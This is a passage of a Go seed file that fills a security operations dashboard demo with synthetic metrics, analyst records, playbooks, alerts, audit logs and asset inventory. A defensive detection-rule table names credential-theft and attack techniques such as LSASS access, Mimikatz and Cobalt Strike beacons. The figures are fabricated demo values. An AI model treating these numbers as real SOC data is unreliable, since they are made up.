			total_hits INTEGER DEFAULT 0, true_positives INTEGER DEFAULT 0,
			false_positives INTEGER DEFAULT 0, avg_execution_ms INTEGER DEFAULT 0,
			last_hit_at TIMESTAMP, status TEXT DEFAULT 'active',
			accuracy_score INTEGER DEFAULT 0,
			created_at TIMESTAMP DEFAULT NOW(), updated_at TIMESTAMP DEFAULT NOW())`,

		`CREATE TABLE IF NOT EXISTS sme_playbook_stats (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			playbook_id TEXT NOT NULL UNIQUE, playbook_name TEXT NOT NULL,
			category TEXT NOT NULL, total_executions INTEGER DEFAULT 0,
			successful INTEGER DEFAULT 0, failed INTEGER DEFAULT 0,
			avg_runtime_secs INTEGER DEFAULT 0, analyst_hours_saved NUMERIC(8,2) DEFAULT 0,
			last_run_at TIMESTAMP, status TEXT DEFAULT 'active',
			created_at TIMESTAMP DEFAULT NOW())`,

		`CREATE TABLE IF NOT EXISTS sme_reports (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			report_id TEXT NOT NULL UNIQUE, title TEXT NOT NULL,
			report_type TEXT NOT NULL, generated_by TEXT NOT NULL,
			format TEXT DEFAULT 'pdf', size_bytes BIGINT DEFAULT 0,
			period_start DATE, period_end DATE, summary TEXT,
			created_at TIMESTAMP DEFAULT NOW())`,

		`CREATE TABLE IF NOT EXISTS sme_notifications (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			event_type TEXT NOT NULL, title TEXT NOT NULL,
			message TEXT NOT NULL, severity TEXT NOT NULL DEFAULT 'info',
			source TEXT, read BOOLEAN DEFAULT FALSE,
			created_at TIMESTAMP DEFAULT NOW())`,

		`CREATE TABLE IF NOT EXISTS sme_audit (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL,
			action TEXT NOT NULL, object_type TEXT NOT NULL,
			object_id TEXT, object_name TEXT, actor TEXT NOT NULL,
			ip_address TEXT, details TEXT, created_at TIMESTAMP DEFAULT NOW())`,
	} {
		mustExec(db, q)
	}

	// ── 90 days of daily snapshots ───────────────────────────────────────────────
	type snap struct {
		health, analysts, online, autoCov                      int
		totalAlerts, critAlerts, highAlerts, medAlerts, lowAlerts int
		suppressed, fp, escalated, dups, queue                 int
		procMins                                               float64
		totalInc, critInc, openInc, closedInc                 int
		mttd, mtta, mttc, mttr, mttrec                        float64
		sla, openCases, closedCases, backlog, esc, reopen     int
		pbExec, autoRate                                       int
		hoursSaved                                             float64
		srExec, iocHits, malware, ransomware, actorHits       int
		healthy, offline, quarantine, fwBlocks, netAnom       int
		critVulns, highVulns, patchComp, compScore            int
		logRate                                               int64
		eps, storage                                          int
	}

	start := snap{
		health: 68, analysts: 10, online: 6, autoCov: 52,
		totalAlerts: 3841, critAlerts: 84, highAlerts: 612, medAlerts: 1247, lowAlerts: 1898,
		suppressed: 421, fp: 334, escalated: 94, dups: 201, queue: 147, procMins: 11.2,
		totalInc: 28, critInc: 8, openInc: 9, closedInc: 19,
		mttd: 28.4, mtta: 12.1, mttc: 41.2, mttr: 194.8, mttrec: 480.0,
		sla: 78, openCases: 41, closedCases: 23, backlog: 18, esc: 8, reopen: 3,
		pbExec: 198, autoRate: 82, hoursSaved: 11.4,
		srExec: 124, iocHits: 1247, malware: 94, ransomware: 11, actorHits: 48,
		healthy: 1798, offline: 41, quarantine: 9, fwBlocks: 2847, netAnom: 194,
		critVulns: 89, highVulns: 481, patchComp: 68, compScore: 71,
		logRate: 312840000, eps: 3841, storage: 67,
	}
	end := snap{
		health: 84, analysts: 12, online: 8, autoCov: 68,
		totalAlerts: 2847, critAlerts: 47, highAlerts: 284, medAlerts: 891, lowAlerts: 1625,
		suppressed: 241, fp: 176, escalated: 61, dups: 122, queue: 89, procMins: 7.4,
		totalInc: 14, critInc: 4, openInc: 4, closedInc: 10,
		mttd: 18.4, mtta: 7.2, mttc: 28.4, mttr: 192.0, mttrec: 420.0,
		sla: 91, openCases: 19, closedCases: 34, backlog: 9, esc: 3, reopen: 1,
		pbExec: 284, autoRate: 94, hoursSaved: 14.2,
		srExec: 187, iocHits: 2841, malware: 61, ransomware: 8, actorHits: 28,
		healthy: 1823, offline: 19, quarantine: 3, fwBlocks: 1284, netAnom: 94,
		critVulns: 47, highVulns: 354, patchComp: 82, compScore: 79,
		logRate: 411200000, eps: 4128, storage: 61,
	}

	lerp := func(a, b, t float64) float64 { return a + (b-a)*t }
	lerpi := func(a, b int, t float64) int { return int(lerp(float64(a), float64(b), t)) }
	lerpl := func(a, b int64, t float64) int64 { return int64(lerp(float64(a), float64(b), t)) }
	lerpf := func(a, b float64, t float64) float64 { return lerp(a, b, t) }

	for i := 90; i >= 0; i-- {
		d := now.AddDate(0, 0, -i)
		t := float64(90-i) / 90.0
		nz := float64(i%7) - 3.0 // zig-zag noise

		s := snap{
			health:      lerpi(start.health, end.health, t),
			analysts:    lerpi(start.analysts, end.analysts, t),
			online:      lerpi(start.online, end.online, t),
			autoCov:     lerpi(start.autoCov, end.autoCov, t),
			totalAlerts: lerpi(start.totalAlerts, end.totalAlerts, t) + int(nz*40),
			critAlerts:  lerpi(start.critAlerts, end.critAlerts, t) + int(nz*2),
			highAlerts:  lerpi(start.highAlerts, end.highAlerts, t),
			medAlerts:   lerpi(start.medAlerts, end.medAlerts, t),
			lowAlerts:   lerpi(start.lowAlerts, end.lowAlerts, t),
			suppressed:  lerpi(start.suppressed, end.suppressed, t),
			fp:          lerpi(start.fp, end.fp, t),
			escalated:   lerpi(start.escalated, end.escalated, t),
			dups:        lerpi(start.dups, end.dups, t),
			queue:       lerpi(start.queue, end.queue, t),
			procMins:    lerpf(start.procMins, end.procMins, t),
			totalInc:    lerpi(start.totalInc, end.totalInc, t) + int(nz*0.5),
			critInc:     lerpi(start.critInc, end.critInc, t),
			openInc:     lerpi(start.openInc, end.openInc, t),
			closedInc:   lerpi(start.closedInc, end.closedInc, t),
			mttd:        lerpf(start.mttd, end.mttd, t) + nz*0.5,
			mtta:        lerpf(start.mtta, end.mtta, t),
			mttc:        lerpf(start.mttc, end.mttc, t),
			mttr:        lerpf(start.mttr, end.mttr, t),
			mttrec:      lerpf(start.mttrec, end.mttrec, t),
			sla:         lerpi(start.sla, end.sla, t),
			openCases:   lerpi(start.openCases, end.openCases, t),
			closedCases: lerpi(start.closedCases, end.closedCases, t),
			backlog:     lerpi(start.backlog, end.backlog, t),
			esc:         lerpi(start.esc, end.esc, t),
			reopen:      lerpi(start.reopen, end.reopen, t),
			pbExec:      lerpi(start.pbExec, end.pbExec, t) + int(nz*3),
			autoRate:    lerpi(start.autoRate, end.autoRate, t),
			hoursSaved:  lerpf(start.hoursSaved, end.hoursSaved, t),
			srExec:      lerpi(start.srExec, end.srExec, t),
			iocHits:     lerpi(start.iocHits, end.iocHits, t),
			malware:     lerpi(start.malware, end.malware, t),
			ransomware:  lerpi(start.ransomware, end.ransomware, t),
			actorHits:   lerpi(start.actorHits, end.actorHits, t),
			healthy:     lerpi(start.healthy, end.healthy, t),
			offline:     lerpi(start.offline, end.offline, t),
			quarantine:  lerpi(start.quarantine, end.quarantine, t),
			fwBlocks:    lerpi(start.fwBlocks, end.fwBlocks, t),
			netAnom:     lerpi(start.netAnom, end.netAnom, t),
			critVulns:   lerpi(start.critVulns, end.critVulns, t),
			highVulns:   lerpi(start.highVulns, end.highVulns, t),
			patchComp:   lerpi(start.patchComp, end.patchComp, t),
			compScore:   lerpi(start.compScore, end.compScore, t),
			logRate:     lerpl(start.logRate, end.logRate, t),
			eps:         lerpi(start.eps, end.eps, t),
			storage:     lerpi(start.storage, end.storage, t),
		}

		mustExec(db, `INSERT INTO sme_snapshots (
			tenant_id,snapshot_date,soc_health_score,active_analysts,analysts_online,
			automation_coverage,total_alerts,critical_alerts,high_alerts,medium_alerts,low_alerts,
			suppressed_alerts,false_positives,escalated_alerts,duplicate_alerts,alert_queue_size,
			alert_processing_mins,total_incidents,critical_incidents,open_incidents,closed_incidents,
			mttd_mins,mtta_mins,mttc_mins,mttr_mins,mttrec_mins,sla_compliance,
			open_cases,closed_cases,case_backlog,escalated_cases,reopened_cases,
			playbook_executions,automation_success_rate,analyst_hours_saved,script_runner_executions,
			ioc_hits,malware_detections,ransomware_detections,threat_actor_hits,
			healthy_endpoints,offline_agents,quarantined_endpoints,firewall_blocks,network_anomalies,
			critical_vulns,high_vulns,patch_compliance,compliance_score,
			log_ingestion_rate,eps,storage_utilization)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20,
			        $21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34,$35,$36,
			        $37,$38,$39,$40,$41,$42,$43,$44,$45,$46,$47,$48,$49,$50,$51,$52)
			ON CONFLICT (tenant_id,snapshot_date) DO NOTHING`,
			tid, d.Format("2006-01-02"),
			s.health, s.analysts, s.online, s.autoCov,
			s.totalAlerts, s.critAlerts, s.highAlerts, s.medAlerts, s.lowAlerts,
			s.suppressed, s.fp, s.escalated, s.dups, s.queue, s.procMins,
			s.totalInc, s.critInc, s.openInc, s.closedInc,
			s.mttd, s.mtta, s.mttc, s.mttr, s.mttrec, s.sla,
			s.openCases, s.closedCases, s.backlog, s.esc, s.reopen,
			s.pbExec, s.autoRate, s.hoursSaved, s.srExec,
			s.iocHits, s.malware, s.ransomware, s.actorHits,
			s.healthy, s.offline, s.quarantine, s.fwBlocks, s.netAnom,
			s.critVulns, s.highVulns, s.patchComp, s.compScore,
			s.logRate, s.eps, s.storage,
		)
	}

	// ── analyst performance (30 days × 5 analysts) ───────────────────────────────
	type analyst struct{ name, team, shift string }
	analysts := []analyst{
		{"alice.zhang", "Tier 1 SOC", "day"},
		{"bob.patel", "Tier 1 SOC", "day"},
		{"carol.kim", "Tier 2 SOC", "day"},
		{"david.chen", "Tier 2 SOC", "evening"},
		{"eve.okafor", "Tier 3 / Threat Hunt", "evening"},
		{"frank.russo", "Tier 1 SOC", "night"},
		{"grace.lee", "IR Team", "day"},
	}
	for day := 29; day >= 0; day-- {
		d := now.AddDate(0, 0, -day).Format("2006-01-02")
		for ai, a := range analysts {
			base := 40 - ai*4
			mustExec(db, `INSERT INTO sme_analyst_perf
				(tenant_id,analyst_name,team,shift,perf_date,
				 alerts_investigated,incidents_resolved,cases_closed,
				 avg_response_mins,avg_investigation_mins,false_positive_rate,
				 workload_score,productivity_score,burnout_index)
				VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14)
				ON CONFLICT (tenant_id,analyst_name,perf_date) DO NOTHING`,
				tid, a.name, a.team, a.shift, d,
				base+day%8, (base/8)+day%3, (base/12)+day%2,
				float64(8-ai)+float64(day%5)*0.3,
				float64(18+ai*4)+float64(day%7)*0.8,
				float64(3+ai)+float64(day%4)*0.5,
				60+ai*4-(day%10), 90-ai*5+(day%8), 30+ai*8+(day%12),
			)
		}
	}

	// ── detection rules ──────────────────────────────────────────────────────────
	type ruleRow struct {
		id, name, rtype, tech, tactic string
		hits, tp, fp2, execMs, acc    int
	}
	rules := []ruleRow{
		{"SME-RULE-001", "Ransomware File Extension Modification", "sigma", "T1486", "Impact", 847, 832, 15, 24, 98},
		{"SME-RULE-002", "LSASS Memory Access via OpenProcess", "sigma", "T1003.001", "Credential Access", 1241, 1198, 43, 18, 97},
		{"SME-RULE-003", "Suspicious PowerShell Encoded Command", "sigma", "T1059.001", "Execution", 4812, 2891, 1921, 12, 60},
		{"SME-RULE-004", "Cobalt Strike Beacon Pattern", "yara", "T1071.001", "C2", 284, 278, 6, 180, 98},
		{"SME-RULE-005", "Lateral Movement via PsExec", "sigma", "T1570", "Lateral Movement", 341, 318, 23, 21, 93},
		{"SME-RULE-006", "DNS Beaconing Pattern", "sigma", "T1071.004", "C2", 1847, 1621, 226, 45, 88},
		{"SME-RULE-007", "Volume Shadow Copy Deletion", "sigma", "T1490", "Impact", 47, 47, 0, 8, 100},
		{"SME-RULE-008", "Credential Stuffing Brute Force", "sigma", "T1110.004", "Credential Access", 2841, 2241, 600, 6, 79},
		{"SME-RULE-009", "Mimikatz Detection via Strings", "yara", "T1003", "Credential Access", 612, 601, 11, 240, 98},
		{"SME-RULE-010", "Phishing Link Click Detected", "sigma", "T1566.002", "Initial Access", 3841, 847, 2994, 4, 22},
		{"SME-RULE-011", "WMI Persistence Mechanism", "sigma", "T1547.001", "Persistence", 284, 271, 13, 32, 95},
		{"SME-RULE-012", "Token Impersonation via DuplicateToken", "sigma", "T1134.001", "Privilege Escalation", 198, 191, 7, 28, 96},
		{"SME-RULE-013", "AWS CloudTrail Tampering", "sigma", "T1562.008", "Defense Evasion", 41, 39, 2, 15, 95},
		{"SME-RULE-014", "Network Port Scan Detection", "sigma", "T1046", "Discovery", 18441, 1124, 17317, 3, 6},
		{"SME-RULE-015", "Emotet C2 Communication", "yara", "T1071.001", "C2", 384, 381, 3, 420, 99},
	}
	for _, r := range rules {
		lastHit := now.Add(-time.Duration(r.hits%240) * time.Minute)
		mustExec(db, `INSERT INTO sme_detection_rules
			(tenant_id,rule_id,rule_name,rule_type,mitre_technique,mitre_tactic,
			 total_hits,true_positives,false_positives,avg_execution_ms,last_hit_at,status,accuracy_score)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)
			ON CONFLICT (rule_id) DO NOTHING`,
			tid, r.id, r.name, r.rtype, r.tech, r.tactic,
			r.hits, r.tp, r.fp2, r.execMs, lastHit, "active", r.acc,
		)
	}

	// ── playbook stats ───────────────────────────────────────────────────────────
	type pbRow struct {
		id, name, cat string
		total, succ, fail, runtimeS int
		hrsSaved float64
		minsAgo  int
	}
	playbooks := []pbRow{
		{"PB-001", "Phishing Email Auto-Triage", "email_security", 2847, 2812, 35, 42, 284.7, 5},
		{"PB-002", "Account Lockout Investigation", "identity", 1284, 1267, 17, 24, 128.4, 12},
		{"PB-003", "Ransomware Containment", "endpoint", 47, 46, 1, 184, 94.0, 180},
		{"PB-004", "IOC Enrichment & Block", "threat_intel", 4812, 4789, 23, 18, 481.2, 2},
		{"PB-005", "Firewall Block & Alert", "network", 3841, 3829, 12, 8, 384.1, 1},
		{"PB-006", "Malware Sandbox Analysis", "endpoint", 612, 591, 21, 240, 122.4, 45},
		{"PB-007", "Vulnerability Patch Verification", "vulnerability", 284, 272, 12, 86, 56.8, 60},
		{"PB-008", "Credential Reset After Compromise", "identity", 198, 196, 2, 36, 39.6, 120},
		{"PB-009", "Cloud Security Alert Response", "cloud", 841, 832, 9, 54, 168.2, 30},
		{"PB-010", "Endpoint Isolation", "endpoint", 28, 28, 0, 124, 28.0, 480},
	}
	for _, p := range playbooks {
		lastRun := now.Add(-time.Duration(p.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO sme_playbook_stats
			(tenant_id,playbook_id,playbook_name,category,total_executions,
			 successful,failed,avg_runtime_secs,analyst_hours_saved,last_run_at,status)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11)
			ON CONFLICT (playbook_id) DO NOTHING`,
			tid, p.id, p.name, p.cat, p.total, p.succ, p.fail, p.runtimeS, p.hrsSaved, lastRun, "active",
		)
	}

	// ── reports ──────────────────────────────────────────────────────────────────
	type rptRow struct {
		id, title, rtype, by string
		sizeKB, daysAgo      int
		periodDays           int
	}
	reports := []rptRow{
		{"SME-RPT-001", "Daily SOC Operations Report — " + now.Format("Jan 02 2006"), "daily_operations", "system", 220, 0, 1},
		{"SME-RPT-002", "Weekly SOC Performance Report — W28 2025", "weekly_performance", "carol.kim", 480, 3, 7},
		{"SME-RPT-003", "Monthly SOC KPI Report — June 2025", "monthly_kpi", "alice.zhang", 920, 7, 30},
		{"SME-RPT-004", "Analyst Performance Report — Q2 2025", "analyst_performance", "carol.kim", 640, 14, 90},
		{"SME-RPT-005", "Detection Performance Report — June 2025", "detection_performance", "bob.patel", 540, 7, 30},
		{"SME-RPT-006", "Automation Effectiveness Report — Q2 2025", "automation_effectiveness", "alice.zhang", 380, 30, 90},
		{"SME-RPT-007", "SLA Compliance Report — June 2025", "sla_compliance", "carol.kim", 280, 7, 30},
		{"SME-RPT-008", "Weekly SOC Performance Report — W27 2025", "weekly_performance", "system", 460, 10, 7},
	}
	for _, r := range reports {
		createdAt := now.AddDate(0, 0, -r.daysAgo)
		periodEnd := now.AddDate(0, 0, -r.daysAgo).Format("2006-01-02")
		periodStart := now.AddDate(0, 0, -r.daysAgo-r.periodDays).Format("2006-01-02")
		mustExec(db, `INSERT INTO sme_reports
			(tenant_id,report_id,title,report_type,generated_by,format,size_bytes,period_start,period_end,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) ON CONFLICT (report_id) DO NOTHING`,
			tid, r.id, r.title, r.rtype, r.by, "pdf",
			int64(r.sizeKB)*1024, periodStart, periodEnd, createdAt,
		)
	}

	// ── notifications ────────────────────────────────────────────────────────────
	type notifRow struct {
		etype, title, msg, sev, source string
		read                           bool
		minsAgo                        int
	}
	notifs := []notifRow{
		{"sla_breach", "CRITICAL: P1 SLA Breach", "Incident INC-4821 has exceeded the 4-hour P1 SLA. Immediate escalation required.", "critical", "SOAR", false, 8},
		{"ransomware_detected", "Ransomware Activity: WKSTN-FIN-047", "LockBit 3.0 IOCs matched. Endpoint automatically isolated. IR team notified.", "critical", "EDR", false, 15},
		{"high_alert_volume", "Alert Volume Spike Detected", "Alert volume 38% above 7-day average for the past 2 hours. Review suppression rules.", "high", "SIEM", false, 32},
		{"analyst_burnout", "Analyst Burnout Warning: eve.okafor", "Burnout index reached 74/100. Recommended: redistribute workload before threshold breach.", "high", "SOC Platform", false, 60},
		{"detection_gap", "Detection Gap: T1048 Not Covered", "No active rule covers DNS tunneling exfiltration (T1048). Threat intel indicates active campaigns.", "high", "Threat Intel", false, 120},
		{"automation_failure", "Playbook Failure: Ransomware Containment", "PB-003 failed on INC-4819. Manual intervention required. Error: API timeout on EDR isolation.", "high", "SOAR", false, 45},
		{"report_ready", "Daily SOC Report Generated", "Today's daily operations report is ready for review.", "info", "Reports", true, 180},
		{"patch_overdue", "Critical Patch Overdue: CVE-2024-3400", "47 systems still unpatched. Patch was due 3 days ago. Risk escalating.", "high", "Vuln Scanner", true, 4320},
		{"sla_warning", "SLA Warning: 3 Incidents Approaching Breach", "Incidents INC-4817, INC-4818, INC-4822 approaching SLA limit within 45 minutes.", "medium", "SOAR", true, 90},
		{"infra_degraded", "Email Security Degraded", "Microsoft Defender for O365 showing elevated latency (280ms). Monitoring.", "medium", "Infrastructure", true, 120},
	}
	for _, n := range notifs {
		createdAt := now.Add(-time.Duration(n.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO sme_notifications
			(tenant_id,event_type,title,message,severity,source,read,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, n.etype, n.title, n.msg, n.sev, n.source, n.read, createdAt,
		)
	}

	// ── audit trail ──────────────────────────────────────────────────────────────
	type auditRow struct {
		action, otype, oid, oname, actor, ip, details string
		minsAgo                                        int
	}
	audits := []auditRow{
		{"dashboard_accessed", "dashboard", "", "SOC Metrics Dashboard", "carol.kim", "10.0.1.45", "Tab: dashboard", 2},
		{"report_generated", "report", "SME-RPT-001", "Daily SOC Operations Report", "system", "127.0.0.1", "Type: daily_operations, Period: 1d", 180},
		{"kpi_configured", "kpi", "KPI-SLA", "SLA Compliance KPI", "alice.zhang", "10.0.1.22", "Threshold changed: 85% → 90%", 720},
		{"dashboard_accessed", "dashboard", "", "SOC Metrics Dashboard", "bob.patel", "10.0.2.11", "Tab: analysts", 60},
		{"report_generated", "report", "SME-RPT-002", "Weekly Performance Report W28", "carol.kim", "10.0.1.45", "Type: weekly_performance, Period: 7d", 4320},
		{"dashboard_shared", "dashboard", "DASH-SOC-001", "SOC Dashboard", "alice.zhang", "10.0.1.22", "Shared with: management@corp.com", 10080},
		{"widget_configured", "widget", "WGT-HEALTH", "SOC Health Widget", "carol.kim", "10.0.1.45", "Layout: moved to top-left position", 2880},
		{"dashboard_accessed", "dashboard", "", "SOC Metrics Dashboard", "grace.lee", "10.0.3.88", "Tab: incidents", 30},
		{"report_generated", "report", "SME-RPT-003", "Monthly KPI Report June 2025", "alice.zhang", "10.0.1.22", "Type: monthly_kpi, Period: 30d", 10080},
		{"kpi_configured", "kpi", "KPI-MTTD", "MTTD KPI Target", "carol.kim", "10.0.1.45", "Target updated: 30min → 20min", 4320},
		{"dashboard_accessed", "dashboard", "", "SOC Metrics Dashboard", "david.chen", "10.0.4.12", "Tab: automation", 15},
		{"report_generated", "report", "SME-RPT-004", "Analyst Performance Q2 2025", "carol.kim", "10.0.1.45", "Type: analyst_performance, Period: 90d", 20160},
	}
	for _, a := range audits {
		createdAt := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		mustExec(db, `INSERT INTO sme_audit
			(tenant_id,action,object_type,object_id,object_name,actor,ip_address,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
			tid, a.action, a.otype, exeNullStrSeed(a.oid), exeNullStrSeed(a.oname),
			a.actor, a.ip, a.details, createdAt,
		)
	}

	log.Printf("SME seed: 91 snapshots, %d analyst records, %d rules, %d playbooks, %d reports, %d notifications, %d audit",
		30*len(analysts), len(rules), len(playbooks), len(reports), len(notifs), len(audits))
}

// ── Assets CMDB Enterprise Seeder ─────────────────────────────────────────────

func seedAssetsCMDBEnterprise(db *sql.DB) {
	const tid = "9999"
	now := time.Now()

	// ensure tables exist
	for _, s := range []string{
		`CREATE TABLE IF NOT EXISTS ace_assets (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, asset_id TEXT NOT NULL,
			name TEXT NOT NULL, hostname TEXT, asset_type TEXT NOT NULL DEFAULT 'endpoint',
			category TEXT NOT NULL DEFAULT 'windows', status TEXT NOT NULL DEFAULT 'online',
			owner TEXT, business_unit TEXT, department TEXT,
			criticality TEXT NOT NULL DEFAULT 'medium', risk_score INTEGER DEFAULT 0,
			internet_facing BOOLEAN DEFAULT FALSE, managed BOOLEAN DEFAULT TRUE,
			location TEXT, tags TEXT DEFAULT '[]', ip_addresses TEXT DEFAULT '[]',
			mac_address TEXT, os_name TEXT, os_version TEXT, domain TEXT,
			serial_number TEXT, manufacturer TEXT, model TEXT,
			cpu_cores INTEGER DEFAULT 0, memory_gb INTEGER DEFAULT 0,
			disk_gb INTEGER DEFAULT 0, disk_used_pct INTEGER DEFAULT 0,
			cpu_usage_pct INTEGER DEFAULT 0, memory_usage_pct INTEGER DEFAULT 0,
			agent_status TEXT DEFAULT 'none', patch_status TEXT DEFAULT 'unknown',
			antivirus_status TEXT DEFAULT 'unknown', firewall_status TEXT DEFAULT 'unknown',
			backup_status TEXT DEFAULT 'unknown', cert_expiry_days INTEGER DEFAULT -1,
			open_ports TEXT DEFAULT '[]', running_services INTEGER DEFAULT 0,
			installed_software_count INTEGER DEFAULT 0, active_users TEXT DEFAULT '[]',
			discovery_source TEXT DEFAULT 'manual', last_seen_at TIMESTAMP,
			first_seen_at TIMESTAMP DEFAULT NOW(), created_at TIMESTAMP DEFAULT NOW(),
			updated_at TIMESTAMP DEFAULT NOW(), UNIQUE(tenant_id, asset_id))`,
		`CREATE TABLE IF NOT EXISTS ace_timeline (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, asset_id TEXT NOT NULL,
			event_type TEXT NOT NULL, summary TEXT NOT NULL, actor TEXT,
			severity TEXT DEFAULT 'info', details TEXT, created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS ace_relationships (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, source_id TEXT NOT NULL,
			target_id TEXT NOT NULL, relationship_type TEXT NOT NULL, description TEXT,
			created_at TIMESTAMP DEFAULT NOW(),
			UNIQUE(tenant_id, source_id, target_id, relationship_type))`,
		`CREATE TABLE IF NOT EXISTS ace_reports (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, report_id TEXT NOT NULL UNIQUE,
			title TEXT NOT NULL, report_type TEXT NOT NULL, generated_by TEXT NOT NULL,
			format TEXT DEFAULT 'pdf', size_bytes BIGINT DEFAULT 0,
			asset_count INTEGER DEFAULT 0, created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS ace_notifications (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, event_type TEXT NOT NULL,
			title TEXT NOT NULL, message TEXT NOT NULL, severity TEXT NOT NULL DEFAULT 'info',
			source TEXT, asset_id TEXT, read BOOLEAN DEFAULT FALSE,
			created_at TIMESTAMP DEFAULT NOW())`,
		`CREATE TABLE IF NOT EXISTS ace_audit (
			id SERIAL PRIMARY KEY, tenant_id TEXT NOT NULL, action TEXT NOT NULL,
			object_type TEXT NOT NULL, object_id TEXT, object_name TEXT,
			actor TEXT NOT NULL, ip_address TEXT, details TEXT,
			created_at TIMESTAMP DEFAULT NOW())`,
	} {
		db.Exec(s)
	}

	type aceAsset struct {
		assetID         string
		name            string
		hostname        string
		assetType       string
		category        string
		status          string
		owner           string
		businessUnit    string
		department      string
		criticality     string
		riskScore       int
		internetFacing  bool
		managed         bool
		location        string
		tags            string
		ipAddresses     string
		macAddress      string
		osName          string
		osVersion       string
		domain          string
		serialNumber    string
		manufacturer    string
		model           string
		cpuCores        int
		memoryGB        int
		diskGB          int
		diskUsedPct     int
		cpuUsagePct     int
		memoryUsagePct  int
		agentStatus     string
		patchStatus     string
		antivirusStatus string
		firewallStatus  string
		backupStatus    string
		certExpiryDays  int
		openPorts       string
		runningServices int
		swCount         int
		activeUsers     string
		discoverySource string
		lastSeenMins    int
		firstSeenDays   int
	}

	assets := []aceAsset{
		// ── Endpoints / Workstations ──────────────────────────────────────────
		{
			assetID: "ACE-WS-001", name: "WKSTN-FIN-047", hostname: "WKSTN-FIN-047",
			assetType: "endpoint", category: "windows", status: "online",
			owner: "john.smith", businessUnit: "Finance", department: "Accounts Payable",
			criticality: "high", riskScore: 78, internetFacing: false, managed: true,
			location: "HQ Floor 3 - Finance Wing", tags: `["finance","high-value","payment-access"]`,
			ipAddresses: `["10.20.47.101","192.168.47.101"]`, macAddress: "00:1A:2B:3C:4D:5E",
			osName: "Windows 11 Pro", osVersion: "22H2", domain: "CORP.LOCAL",
			serialNumber: "FIN047-SN-2023-0892", manufacturer: "Dell", model: "Latitude 5540",
			cpuCores: 8, memoryGB: 16, diskGB: 512, diskUsedPct: 62, cpuUsagePct: 23, memoryUsagePct: 58,
			agentStatus: "active", patchStatus: "behind", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: -1,
			openPorts: `[445,135,3389]`, runningServices: 42, swCount: 87,
			activeUsers: `["john.smith"]`, discoverySource: "EDR Agent", lastSeenMins: 3, firstSeenDays: 420,
		},
		{
			assetID: "ACE-WS-002", name: "WKSTN-HR-023", hostname: "WKSTN-HR-023",
			assetType: "endpoint", category: "windows", status: "online",
			owner: "sarah.jones", businessUnit: "HR", department: "Talent Acquisition",
			criticality: "medium", riskScore: 52, internetFacing: false, managed: true,
			location: "HQ Floor 2 - HR Suite", tags: `["hr","pii-access"]`,
			ipAddresses: `["10.20.23.88"]`, macAddress: "00:2B:3C:4D:5E:6F",
			osName: "Windows 11 Pro", osVersion: "23H2", domain: "CORP.LOCAL",
			serialNumber: "HR023-SN-2024-0112", manufacturer: "HP", model: "EliteBook 845 G10",
			cpuCores: 8, memoryGB: 32, diskGB: 512, diskUsedPct: 38, cpuUsagePct: 12, memoryUsagePct: 41,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: -1,
			openPorts: `[445,135]`, runningServices: 38, swCount: 62,
			activeUsers: `["sarah.jones"]`, discoverySource: "Active Directory", lastSeenMins: 8, firstSeenDays: 180,
		},
		{
			assetID: "ACE-WS-003", name: "WKSTN-DEV-112", hostname: "WKSTN-DEV-112",
			assetType: "endpoint", category: "macos", status: "online",
			owner: "alex.chen", businessUnit: "Engineering", department: "Platform Team",
			criticality: "high", riskScore: 61, internetFacing: false, managed: true,
			location: "HQ Floor 4 - Engineering", tags: `["developer","code-access","github-access"]`,
			ipAddresses: `["10.20.112.55"]`, macAddress: "00:3C:4D:5E:6F:7A",
			osName: "macOS", osVersion: "14.4 Sonoma", domain: "",
			serialNumber: "DEV112-MAC-2024-XYZ", manufacturer: "Apple", model: "MacBook Pro M3",
			cpuCores: 12, memoryGB: 36, diskGB: 1024, diskUsedPct: 54, cpuUsagePct: 31, memoryUsagePct: 62,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: -1,
			openPorts: `[22,8080,3000]`, runningServices: 28, swCount: 143,
			activeUsers: `["alex.chen"]`, discoverySource: "MDM (Intune)", lastSeenMins: 1, firstSeenDays: 90,
		},
		{
			assetID: "ACE-WS-004", name: "WKSTN-EXEC-001", hostname: "WKSTN-EXEC-001",
			assetType: "endpoint", category: "windows", status: "online",
			owner: "ceo@corp.local", businessUnit: "Executive", department: "C-Suite",
			criticality: "critical", riskScore: 91, internetFacing: false, managed: true,
			location: "HQ Floor 10 - Executive Suite", tags: `["c-suite","board-access","critical"]`,
			ipAddresses: `["10.20.1.5"]`, macAddress: "00:4D:5E:6F:7A:8B",
			osName: "Windows 11 Enterprise", osVersion: "23H2", domain: "CORP.LOCAL",
			serialNumber: "EXEC001-SN-2023-9001", manufacturer: "Lenovo", model: "ThinkPad X1 Carbon",
			cpuCores: 12, memoryGB: 32, diskGB: 1024, diskUsedPct: 29, cpuUsagePct: 8, memoryUsagePct: 34,
